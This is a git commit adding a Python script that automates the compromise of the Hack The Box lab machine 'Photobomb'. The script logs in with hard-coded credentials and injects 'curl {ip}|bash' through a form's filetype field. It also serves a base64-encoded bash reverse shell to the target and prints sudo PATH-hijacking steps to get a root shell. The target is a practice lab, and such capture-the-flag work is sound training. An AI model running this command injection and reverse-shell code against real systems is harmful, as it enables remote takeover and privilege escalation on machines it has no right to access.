67bdec8c75ddfb973af3f586f83a360be160ac0e
l44x <138518422+l44x@users.noreply.github.com>
2025-05-28 21:05:43 -0500

    Create Photobomb-pwn3dRoot.py

---
+++ Photobomb-pwn3dRoot.py
@@ -0,0 +1,179 @@
+import sys, os, requests, re, subprocess, paramiko
+import time as cm
+from colorama import Fore, init
+from datetime import datetime
+from questionary import Style, select
+from consolemenu import SelectionMenu
+from sshtunnel import SSHTunnelForwarder
+
+class Tmsg:
+    def __str__(self):
+        return (Fore.LIGHTMAGENTA_EX + "⇛ [" +
+                Fore.CYAN + datetime.now().strftime("%H:%M:%S") +
+                Fore.LIGHTMAGENTA_EX + "]" + Fore.YELLOW + "-" +
+                Fore.LIGHTMAGENTA_EX + "[" + Fore.WHITE + "P4n3l" +
+                Fore.LIGHTMAGENTA_EX + "]" + Fore.YELLOW + "-" +
+                Fore.LIGHTMAGENTA_EX + "[" + Fore.LIGHTGREEN_EX + "~" +
+                Fore.LIGHTMAGENTA_EX + "]" + Fore.LIGHTGREEN_EX + " ➤" + Fore.RESET)
+
+init(autoreset=True)
+custom_style = Style([
+    ('qmark', 'fg:#FF5F87 bold'),
+    ('question', 'fg:#017cff bold'),             
+    ('answer', 'fg:#01ff4e bold'),     
+    ('pointer', 'fg:#fbff00 bold'),    
+    ('highlighted', 'fg:#00FFFF bold'),
+    ('selected', 'fg:#22b9c5 bold'),        
+    ('separator', 'fg:#6C6C6C bold'),
+])
+
+global machine_ip
+global target_machine
+global ln
+
+def banner():
+    os.system("clear")
+    bnn = """
+    
+    ▓█████  ▄████▄   ██░ ██  ██ ▄█▀ ███▄ ▄███▓ ▒█████   █    ██   ██████ 
+    ▓█   ▀ ▒██▀ ▀█  ▓██░ ██▒ ██▄█▒ ▓██▒▀█▀ ██▒▒██▒  ██▒ ██  ▓██▒▒██    ▒ 
+    ▒███   ▒▓█    ▄ ▒██▀▀██░▓███▄░ ▓██    ▓██░▒██░  ██▒▓██  ▒██░░ ▓██▄   
+    ▒▓█  ▄ ▒▓▓▄ ▄██▒░▓█ ░██ ▓██ █▄ ▒██    ▒██ ▒██   ██░▓▓█  ░██░  ▒   ██▒
+    ░▒████▒▒ ▓███▀ ░░▓█▒░██▓▒██▒ █▄▒██▒   ░██▒░ ████▓▒░▒▒█████▓ ▒██████▒▒
+    ░░ ▒░ ░░ ░▒ ▒  ░ ▒ ░░▒░▒▒ ▒▒ ▓▒░ ▒░   ░  ░░ ▒░▒░▒░ ░▒▓▒ ▒ ▒ ▒ ▒▓▒ ▒ ░
+     ░ ░  ░  ░  ▒    ▒ ░▒░ ░░ ░▒ ▒░░  ░      ░  ░ ▒ ▒░ ░░▒░ ░ ░ ░ ░▒  ░ ░
+       ░   ░         ░  ░░ ░░ ░░ ░ ░      ░   ░ ░ ░ ▒   ░░░ ░ ░ ░  ░  ░  
+       ░  ░░ ░       ░  ░  ░░  ░          ░       ░ ░     ░           ░  
+           ░                                                             
+    __________________________________________________________________________
+    [+] Author: Ech0k   [+] G1thub: github.com/l44x   [+] T00l: HTB-Photobomb
+    __________________________________________________________________________\n"""
+    print(Fore.BLUE + f"{bnn}")
+
+tmsg = Tmsg()
+ln = Fore.GREEN+"========================================="+Fore.RESET
+
+def menu_panel():
+    options=["[+] wizar", "[+] root", "[-] exit"]
+    opcion = select(
+        "Selecciona una opción:",
+        choices=options,
+        style=custom_style
+    ).ask()
+        
+    return [opcion,options]
+
+def commands_send(cmd):
+    try:
+        #subprocess.run(cmd, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+        result = subprocess.run(cmd, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+        return result.stdout.strip()
+    except subprocess.CalledProcessError as e:
+        print(f"OcurredErr0r {e}")
+
+def hmsg(user,msg):
+    return Fore.YELLOW+"["+Fore.GREEN+"@"+Fore.WHITE+f"{user}"+Fore.YELLOW+"]"+Fore.GREEN+"-"+Fore.YELLOW+"["+Fore.LIGHTMAGENTA_EX+"♛ "+Fore.WHITE+f"{msg}"+Fore.YELLOW+"]"
+
+#------------------------------------------------------------------------
+
+machine_ip=commands_send('ifconfig | grep destination | awk \'NF{print $NF}\'')
+target_machine="10.10.11.182" # change this if change ip on htb.
+
+
+def checker_status():
+    try:
+        check_hackthebox_vpn="ifconfig | grep tun0"
+        control_status_vpn=commands_send(check_hackthebox_vpn)
+        cm.sleep(.5)
+        if control_status_vpn:
+            print(ln)
+            print(tmsg,Fore.RED + f"[HackTheBoxVPN] > " + Fore.GREEN + f"Successful Connection ;)")
+        else:
+            print(tmsg,Fore.RED + f"[!] Actve ur HackTheBox VPN")
+            sys.exit(1)
+    except subprocess.CalledProcessError as e:
+        print(tmsg,f"OcurredErr0r [Vpn-Status] {e}")
+
+def default_cred_user():
+    try:
+        whoami_default=commands_send('whoami')
+        machine_default_ip=commands_send(f'ping -c 1 {machine_ip} | grep "1 received" ');print(ln)
+        print(tmsg,hmsg("user","Default User connection"))
+        print(tmsg,Fore.RED + f"[HackTheBox - IP] > " + Fore.YELLOW + f"{machine_ip}")
+        print(tmsg,Fore.RED + f"[User-default] > " + Fore.YELLOW + f"{whoami_default}")
+        if machine_default_ip:
+            print(tmsg,Fore.RED + f"[Target Machine] > " + Fore.YELLOW + f"{target_machine}")
+            print(tmsg,Fore.RED + f"[Target Path Exploit] > " + Fore.YELLOW + f"http://{target_machine}/");print(ln)
+        else:
+            print(tmsg,Fore.RED + f"\t\t\t[Target Machine] > " + Fore.RED + f"Checked Photobomb Network");print(ln)
+    except subprocess.CalledProcessError as e:
+        print(f"OcurredErr0r [User-Default] {e}")
+        
+#------------------------------------------------------------------------
+
+url_download = "http://photobomb.htb/printer"
+main_url = "http://photobomb.htb/"
+auth = ('pH0t0', 'b0Mb!')
+def wizar_user_exploit():
+    s = requests.Session()
+    
+    login = s.get(main_url, auth=auth)
+    print(f"[+] Acceso a la página principal: {login.status_code}")
+    
+    headers = {
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0',
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+        'Content-Type': 'application/x-www-form-urlencoded',
+        'Referer': main_url,
+        'Origin': main_url
+    }
+
+    data = {
+        'photo': 'finn-whelen-DTfhsDIWNSg-unsplash.jpg',
+        'filetype': f'jpg;curl {machine_ip}|bash',
+        'dimensions': '3000x2000'
+    }
+
+    response = s.post(url_download, headers=headers, data=data, auth=auth)
+    print(f"[+] Petición enviada: {response.status_code}")
+    print(response.text) 
+
+def root_exploit():
+    print(tmsg,Fore.LIGHTBLUE_EX +f"[root-user Command (Injection Victim Machine)] > " + Fore.LIGHTMAGENTA_EX + f"\n1. cd /tmp\n2. touch [\n3. chmod +x [\n4. echo 'bash -p' > [\n5. sudo PATH=/tmp:$PATH /opt/cleanup.sh")                                
+
+
+#------------------------------------------------------------------------
+
+def undected():
+    try:
+        checker_status();cm.sleep(.8)
+        default_cred_user();cm.sleep(.8)
+        print(Fore.YELLOW+f"=========================================")
+        while True:
+            opcion = menu_panel()
+            print(Fore.YELLOW+f"=========================================")
+            if opcion[0] == opcion[1][0]:
+                print(tmsg,hmsg("user","wizar connection"))
+                print(tmsg,Fore.LIGHTBLUE_EX +f"[wizar] > " + Fore.YELLOW + f"(Exploit) http://{url_download}");cm.sleep(0.2)
+                commands_send("echo 'IyEvYmluL2Jhc2gKCmJhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuOC80NDMgMD4mMQo=' | base64 -d > index.html")
+                commands_send(f"sed -i 's/10.10.16.8/{machine_ip}/g' index.html")
+                print(tmsg,Fore.LIGHTBLUE_EX +f"[wizar-user Command (Http-server)] > " + Fore.LIGHTMAGENTA_EX + f"sudo python3 -m http.server 80")
+                print(tmsg,Fore.LIGHTBLUE_EX +f"[wizar-user Command (Http-server)] > " + Fore.LIGHTMAGENTA_EX + f"sudo nc -nlvp 443")                                
+                input(str(tmsg)+Fore.LIGHTBLUE_EX + f" [wizar-user] > " + Fore.WHITE + f"Press ENTER to continue...")
+                wizar_user_exploit()
+                print(tmsg,Fore.LIGHTBLUE_EX +f"[wizar] > " + Fore.GREEN + f"✔ G00d H4ch1ng Duhhmhm :3");print(ln);cm.sleep(.2)
+            elif opcion[0] == opcion[1][1]:
+                print(tmsg,hmsg("user","root connection"))
+                print(tmsg,Fore.LIGHTBLUE_EX +f"[root] > " + Fore.YELLOW + f"Path Hijacking (Exploit [) http://{target_machine}");cm.sleep(0.2)
+                root_exploit()
+                print(tmsg,Fore.LIGHTBLUE_EX +f"[root] > " + Fore.GREEN + f"✔ G00d H4ch1ng Duhhmhm :3");print(ln);cm.sleep(.2)
+            elif opcion[0] == opcion[1][-1]:
+                break
+            else:
+                break
+    except:
+        pass
+    
+if __name__ == '__main__':
+    banner()
+    undected()
